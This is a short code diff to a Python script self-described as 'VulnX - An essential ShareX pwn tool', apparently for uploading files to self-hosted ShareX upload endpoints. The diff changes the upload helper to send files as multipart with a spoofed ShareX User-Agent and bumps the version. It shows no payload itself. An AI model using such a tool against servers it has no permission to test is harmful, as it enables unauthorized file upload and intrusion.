@@ -1,4 +1,4 @@
-# VulnX
+# VulnX - An essential ShareX pwn tool
 # Author: checksum
 
 import requests
@@ -8,7 +8,7 @@ import validators
 import sys
 from colorama import Fore, init
 
-__version__ = '0.1.0'
+__version__ = '0.1.1'
 
 # constants
 BANNER = fr''' {Fore.WHITE}_____     _     __ __{Fore.LIGHTBLACK_EX}
@@ -33,12 +33,12 @@ def print_warning(a):
     print(f'{Fore.LIGHTWHITE_EX}[ {Fore.LIGHTYELLOW_EX}WARN {Fore.LIGHTWHITE_EX}] {Fore.RESET}{a}')
 
 def upload_file(url, endpoint, file_path, file_name, secret=None):
-    with open(file_path, 'rb') as file:
-        content = file.read()
-    data = {'sharex': content}
+    data = {'sharex': (os.path.basename(file_path), open(file_path, 'rb'), 'text/plain')}
+
     if secret:
         data.update({'secret': secret})
-    return requests.post(url + '/' + endpoint, headers={'User-Agent': 'ShareX/13.1.0'}, files=data)
+
+    return requests.post(url + '/' + endpoint, headers={'User-Agent': 'ShareX/13.2.1'}, files=data)
 
 def is_online(url):
     try:
@@ -73,7 +73,7 @@ def format_url(url, with_path=True):
                     break
                 
                 path += '/' + x
-            
+    
     return protocol + '//' + domain + (path if len(path) > 0 else '')
 
 def validate_file(file):
